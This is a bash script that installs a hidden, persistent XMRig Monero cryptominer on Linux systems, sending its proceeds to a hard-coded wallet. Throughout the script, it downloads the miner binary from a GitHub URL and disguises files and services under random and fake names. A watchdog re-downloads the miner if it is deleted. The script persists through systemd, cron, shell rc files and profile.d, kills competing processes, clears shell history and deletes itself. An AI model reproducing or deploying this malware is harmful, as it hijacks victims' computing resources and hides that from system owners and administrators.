#!/usr/bin/env bash
#=============================================================================
# ANTI-KILL XMRig Deploy — pcgimang/multivitamins
#=============================================================================
# - Binary + config: ~/.cache/.cache_RANDOM
# - Watchdog script: ~/.local/share/.cache_RANDOM (tersembunyi di tempat beda)
# - Watchdog self-heal: kalau binary hilang → re-download
# - 4-layer: systemd + cron + bashrc + profile.d
# - Zero log/pid, self-delete, password dari hostname
#=============================================================================

WALLET="43sxNTTWiKQj4LehDazVb8NQRKDztwiRcPFCivj3PbrqFPhujjxLd5TDCWfT6edSPXVRmUh3vhxysA35uHWnwY5UKGxvYFB"
POOL_URL="pool.supportxmr.com:443"
RAW_URL="https://raw.githubusercontent.com/pcgimang/multivitamins/main"
MARKER="$HOME/.cache/.miner_state"

randstr() {
    if [ -r /dev/urandom ]; then
        head -c "$1" /dev/urandom 2>/dev/null | tr -dc 'a-z0-9' 2>/dev/null
    else
        openssl rand -hex 16 2>/dev/null | tr -dc 'a-z0-9' 2>/dev/null | head -c "$1"
    fi
}

dl() {
    if command -v curl >/dev/null 2>&1; then
        curl -fsSL --connect-timeout 30 --max-time 120 -o "$2" "$1"
    elif command -v wget >/dev/null 2>&1; then
        wget -q --timeout=30 -O "$2" "$1"
    else
        return 1
    fi
}

# ===== RANDOM NAMES =====
MANDARIN=(
    "系统" "核心" "缓存" "管理" "数据库" "维护" "守护" "进程"
    "网络" "存储" "日志" "监控" "引擎" "调度" "备份" "同步"
    "服务" "安全" "认证" "配置"
)

BIN_NAME=""
N=$(( (RANDOM % 5) + 6 ))
i=0; while [ $i -lt $N ]; do
    BIN_NAME="${BIN_NAME}${MANDARIN[$(( RANDOM % 20 ))]}"
    i=$(( i + 1 ))
done
BIN_NAME="${BIN_NAME}_d$(randstr 8)"

WORKDIR="$HOME/.cache/.cache_$(randstr 10)"
# Watchdog dir — coba ~/.local/share dulu, fallback ke ~/.config, fallback ke /tmp
WDOG_DIR=""
for _try in "$HOME/.local/share/.cache_$(randstr 10)" "$HOME/.config/.cache_$(randstr 10)" "/tmp/.hidden_$(randstr 10)"; do
    if mkdir -p "$_try" 2>/dev/null; then
        WDOG_DIR="$_try"
        break
    fi
done
[ -z "$WDOG_DIR" ] && WDOG_DIR="/tmp/.hidden_$(randstr 10)"
WDOG_NAME="wd_$(randstr 12)"
SVC_NAME="svc-$(randstr 10)"
CRON_TAG="mk_$(randstr 8)"

# ===== ARCH =====
ARCH="$(uname -m)"
case "$ARCH" in
    x86_64|amd64) BIN_SRC="systemx86" ;;
    aarch64|arm64) BIN_SRC="system64" ;;
    *) echo "[-] Unsupported: $ARCH" >&2; exit 1 ;;
esac

# ===== PASSWORD =====
if [ -n "${1:-}" ]; then
    PASS="$1"
elif command -v hostname >/dev/null 2>&1; then
    PASS="$(hostname | sha256sum | cut -c1-12)"
elif [ -f /etc/machine-id ] && [ -s /etc/machine-id ]; then
    PASS="$(sha256sum /etc/machine-id | cut -c1-12)"
else
    PASS="$(date +%s | sha256sum | cut -c1-12)"
fi

# ===== DEEP CLEAN =====
set +e

if [ -f "$MARKER" ]; then
    OLD_WD="$(sed -n '1p' "$MARKER" 2>/dev/null)"
    OLD_WDOG="$(sed -n '2p' "$MARKER" 2>/dev/null)"
    OLD_SVC="$(sed -n '3p' "$MARKER" 2>/dev/null)"
    OLD_TAG="$(sed -n '4p' "$MARKER" 2>/dev/null)"

    [ -n "$OLD_SVC" ] && {
        systemctl --user stop "$OLD_SVC" 2>/dev/null
        systemctl --user disable "$OLD_SVC" 2>/dev/null
        systemctl stop "$OLD_SVC" 2>/dev/null
        systemctl disable "$OLD_SVC" 2>/dev/null
        rm -f "$HOME/.config/systemd/user/${OLD_SVC}.service" "/etc/systemd/system/${OLD_SVC}.service" 2>/dev/null
        systemctl --user daemon-reload 2>/dev/null; systemctl daemon-reload 2>/dev/null
    }

    [ -n "$OLD_TAG" ] && {
        command -v crontab >/dev/null 2>&1 && crontab -l 2>/dev/null | grep -v "$OLD_TAG" | crontab - 2>/dev/null
        rm -f "/etc/cron.d/.sys_${OLD_TAG}" 2>/dev/null
        for rc in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.bash_profile" "$HOME/.zshrc" "$HOME/.zprofile"; do
            [ -f "$rc" ] && grep -q "$OLD_TAG" "$rc" 2>/dev/null && {
                grep -v "$OLD_TAG" "$rc" > "${rc}.tmp" && mv "${rc}.tmp" "$rc" 2>/dev/null
            }
        done
        rm -f "/etc/profile.d/.sys_${OLD_TAG}.sh" 2>/dev/null
    }

    [ -n "$OLD_WD" ] && { pgrep -f "$OLD_WD" 2>/dev/null | xargs -r kill -9 2>/dev/null; rm -rf "$OLD_WD" 2>/dev/null; }
    [ -n "$OLD_WDOG" ] && { pgrep -f "$OLD_WDOG" 2>/dev/null | xargs -r kill -9 2>/dev/null; rm -rf "$OLD_WDOG" 2>/dev/null; }
    rm -f "$MARKER" 2>/dev/null
fi

# Kill all mining processes (binary always has suffix _dXXXXXXXX)
ps aux | grep -E '_d[a-z0-9]{8}' | grep -v grep | awk '{print $2}' | xargs -r kill -9 2>/dev/null
pgrep -f 'wd_[a-z0-9]{12}' 2>/dev/null | xargs -r kill -9 2>/dev/null
ps aux | grep '/\.local/share/.cache_\|/\.cache/.cache_' | grep -v grep | awk '{print $2}' | xargs -r kill -9 2>/dev/null
sleep 0.3
ps aux | grep -E '_d[a-z0-9]{8}' | grep -v grep | awk '{print $2}' | xargs -r kill -9 2>/dev/null
pgrep -f 'wd_[a-z0-9]{12}' 2>/dev/null | xargs -r kill -9 2>/dev/null
ps aux | grep '/\.local/share/.cache_\|/\.cache/.cache_' | grep -v grep | awk '{print $2}' | xargs -r kill -9 2>/dev/null

rm -rf "$HOME"/.cache/.cache_* "$HOME"/.local/share/.cache_* 2>/dev/null
rm -f /etc/cron.d/.sys_mk_* /etc/profile.d/.sys_mk_*.sh 2>/dev/null
rm -f "$HOME/.config/systemd/user/svc-"*.service /etc/systemd/system/svc-*.service 2>/dev/null

set -e

# ===== SETUP WORKDIR =====
mkdir -p "$WORKDIR"
dl "${RAW_URL}/${BIN_SRC}" "${WORKDIR}/${BIN_NAME}"
chmod +x "${WORKDIR}/${BIN_NAME}"

cat > "${WORKDIR}/config.json" << XEOF
{
    "autosave": true, "donate-level": 0, "donate-over-proxy": 0,
    "cpu": { "enabled": true, "huge-pages": true, "max-threads-hint": 75 },
    "opencl": false, "cuda": false,
    "pools": [{"url":"${POOL_URL}","user":"${WALLET}","pass":"${PASS}","keepalive":true,"tls":true}]
}
XEOF
chmod 600 "${WORKDIR}/config.json"

# ===== SETUP WATCHDOG (di ~/.local/share, BUKAN di .cache) =====
mkdir -p "$WDOG_DIR"

cat > "${WDOG_DIR}/${WDOG_NAME}" << 'WDOGEOF'
#!/usr/bin/env bash
BIN="__BIN__"
WD="__WD__"
ARCH="__ARCH__"
RAW="__RAW__"
WALLET="__WALLET__"
PASS="__PASS__"

# Rebuild function — bikin ulang binary + config kalau hilang
rebuild() {
    mkdir -p "$WD"
    if [ ! -f "${WD}/${BIN}" ]; then
        if command -v curl >/dev/null 2>&1; then
            curl -fsSL --connect-timeout 30 --max-time 120 -o "${WD}/${BIN}" "${RAW}/${ARCH}" 2>/dev/null
        elif command -v wget >/dev/null 2>&1; then
            wget -q --timeout=30 -O "${WD}/${BIN}" "${RAW}/${ARCH}" 2>/dev/null
        fi
        chmod +x "${WD}/${BIN}" 2>/dev/null
    fi
    if [ ! -f "${WD}/config.json" ]; then
        printf '{"autosave":true,"donate-level":0,"donate-over-proxy":0,"cpu":{"enabled":true,"huge-pages":true,"max-threads-hint":75},"opencl":false,"cuda":false,"pools":[{"url":"pool.supportxmr.com:443","user":"%s","pass":"%s","keepalive":true,"tls":true}]}\n' "$WALLET" "$PASS" > "${WD}/config.json"
        chmod 600 "${WD}/config.json" 2>/dev/null
    fi
}

while :; do
    # Rebuild kalau perlu
    if [ ! -f "${WD}/${BIN}" ] || [ ! -f "${WD}/config.json" ]; then
        rebuild
    fi

    if [ -f "${WD}/${BIN}" ] && [ -f "${WD}/config.json" ]; then
        TS=$(date +%s)
        cd "$WD"
        ./"${BIN}" -c config.json >/dev/null 2>&1
        NOW=$(date +%s)
        RUNTIME=$(( NOW - TS ))
        # Backoff: kalau miner mati <3 detik, sleep 5 detik (mencegah crash loop)
        if [ "$RUNTIME" -lt 3 ]; then
            sleep 5
        else
            sleep 0.1
        fi
    else
        sleep 5
    fi
done
WDOGEOF

sed -i "s|__BIN__|${BIN_NAME}|"   "${WDOG_DIR}/${WDOG_NAME}"
sed -i "s|__WD__|${WORKDIR}|"      "${WDOG_DIR}/${WDOG_NAME}"
sed -i "s|__ARCH__|${BIN_SRC}|"    "${WDOG_DIR}/${WDOG_NAME}"
sed -i "s|__RAW__|${RAW_URL}|"     "${WDOG_DIR}/${WDOG_NAME}"
sed -i "s|__WALLET__|${WALLET}|"   "${WDOG_DIR}/${WDOG_NAME}"
sed -i "s|__PASS__|${PASS}|"       "${WDOG_DIR}/${WDOG_NAME}"
chmod +x "${WDOG_DIR}/${WDOG_NAME}"

# ===== MARKER =====
printf '%s\n%s\n%s\n%s\n' "$WORKDIR" "$WDOG_DIR" "$SVC_NAME" "$CRON_TAG" > "$MARKER"

# ===== L1: SYSTEMD =====
SYSD_OK=0
if command -v systemctl >/dev/null 2>&1; then
    if systemctl --user daemon-reload 2>/dev/null; then
        mkdir -p "$HOME/.config/systemd/user"
        cat > "$HOME/.config/systemd/user/${SVC_NAME}.service" << EOF
[Unit]
Description=System Cache Management Service
After=default.target
[Service]
Type=simple
ExecStart=${WDOG_DIR}/${WDOG_NAME}
Restart=always
RestartSec=0
StandardOutput=null
StandardError=null
[Install]
WantedBy=default.target
EOF
        systemctl --user daemon-reload 2>/dev/null || true
        systemctl --user enable "$SVC_NAME" 2>/dev/null || true
        systemctl --user start "$SVC_NAME" 2>/dev/null || true
        SYSD_OK=1
    elif [ "$(id -u)" = "0" ]; then
        cat > "/etc/systemd/system/${SVC_NAME}.service" << EOF
[Unit]
Description=System Cache Management Service
After=network.target
[Service]
Type=simple
ExecStart=${WDOG_DIR}/${WDOG_NAME}
Restart=always
RestartSec=0
StandardOutput=null
StandardError=null
[Install]
WantedBy=multi-user.target
EOF
        systemctl daemon-reload 2>/dev/null || true
        systemctl enable "$SVC_NAME" 2>/dev/null || true
        systemctl start "$SVC_NAME" 2>/dev/null || true
        SYSD_OK=1
    fi
fi

# ===== L2: CRON =====
CRON_OK=0
CMD="pgrep -f '${BIN_NAME}' >/dev/null 2>&1 || nohup ${WDOG_DIR}/${WDOG_NAME} >/dev/null 2>&1 &"
EVERY="* * * * * $CMD"
REBOOT="@reboot (sleep \$((RANDOM % 30)) && $CMD)"

if command -v crontab >/dev/null 2>&1; then
    TMPC="$(mktemp 2>/dev/null || echo "/tmp/.ct_$(randstr 6)")"
    crontab -l 2>/dev/null | grep -v "$CRON_TAG" > "$TMPC" 2>/dev/null || true
    printf '# %s\n%s\n%s\n' "$CRON_TAG" "$EVERY" "$REBOOT" >> "$TMPC"
    crontab "$TMPC" 2>/dev/null && CRON_OK=1
    rm -f "$TMPC" 2>/dev/null
fi
[ "$CRON_OK" = "0" ] && [ -d /etc/cron.d ] && [ -w /etc/cron.d ] && {
    printf '# %s\n%s\n%s\n' "$CRON_TAG" "$EVERY" "$REBOOT" > "/etc/cron.d/.sys_${CRON_TAG}"
    chmod 644 "/etc/cron.d/.sys_${CRON_TAG}" 2>/dev/null; CRON_OK=1
}
[ "$CRON_OK" = "0" ] && [ -f /etc/crontab ] && [ -w /etc/crontab ] && {
    grep -q "$CRON_TAG" /etc/crontab 2>/dev/null || printf '# %s\n%s\n%s\n' "$CRON_TAG" "$EVERY" "$REBOOT" >> /etc/crontab
    CRON_OK=1
}

# ===== L3: SHELL RC =====
RC_OK=0
HOOK="pgrep -f '${BIN_NAME}' >/dev/null 2>&1 || (nohup ${WDOG_DIR}/${WDOG_NAME} >/dev/null 2>&1 &) 2>/dev/null # ${CRON_TAG}"
for rc in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.bash_profile" "$HOME/.zshrc" "$HOME/.zprofile"; do
    [ -f "$rc" ] || continue
    grep -q "$CRON_TAG" "$rc" 2>/dev/null && {
        grep -v "$CRON_TAG" "$rc" > "${rc}.tmp" && mv "${rc}.tmp" "$rc" 2>/dev/null
    }
    echo "$HOOK" >> "$rc"
    RC_OK=1
done
[ "$RC_OK" = "0" ] && echo "$HOOK" >> "$HOME/.bashrc"

# ===== L4: PROFILE.D =====
[ -d /etc/profile.d ] && [ -w /etc/profile.d ] && {
    echo "pgrep -f '${BIN_NAME}' >/dev/null 2>&1 || (nohup ${WDOG_DIR}/${WDOG_NAME} >/dev/null 2>&1 &) 2>/dev/null" \
        > "/etc/profile.d/.sys_${CRON_TAG}.sh"
    chmod 644 "/etc/profile.d/.sys_${CRON_TAG}.sh" 2>/dev/null
} || true

# ===== LAUNCH (fallback manual only) =====
if [ "$SYSD_OK" != "1" ] && [ "$CRON_OK" != "1" ]; then
    nohup "${WDOG_DIR}/${WDOG_NAME}" >/dev/null 2>&1 &
    disown 2>/dev/null || true
fi

# ===== SELF-DELETE =====
history -c 2>/dev/null || true
[ -f "$0" ] && [ "$(basename "$0")" != "bash" ] && rm -f "$0" 2>/dev/null || true

echo "============================================"
echo "  DEPLOY COMPLETE"
echo "============================================"
echo "  Arch      : $ARCH"
echo "  Password  : $PASS"
echo "  systemd   : $([ "$SYSD_OK" = "1" ] && echo 'OK' || echo 'N/A')"
echo "  cron      : $([ "$CRON_OK" = "1" ] && echo 'OK' || echo 'N/A')"
echo "  shellrc   : $([ "$RC_OK" = "1" ] && echo 'OK' || echo 'N/A')"
echo "============================================"